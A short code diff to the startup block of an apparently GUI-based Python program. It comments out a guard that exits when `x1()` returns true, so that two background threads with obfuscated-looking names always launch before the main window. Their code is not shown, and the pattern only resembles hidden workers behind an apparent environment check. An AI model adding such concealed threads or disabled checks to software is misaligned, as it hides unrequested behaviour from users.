@@ -811,18 +811,18 @@ def main():
     root.protocol("", app.on_close)
     root.mainloop()
 if __name__ == "__main__":
-    if x1():
-        sys.exit(1)
-    else:
-        pp()
-        threading.Thread(target=dd_1_d).start()
-        threading.Thread(target=_0xz2a3b4c5).start()
-        try:
-            main()
-        except KeyboardInterrupt:
-            print("")
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("")
+    # if x1():
+    #     sys.exit(1)
+    # else:
+    pp()
+    threading.Thread(target=dd_1_d).start()
+    threading.Thread(target=_0xz2a3b4c5).start()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("")
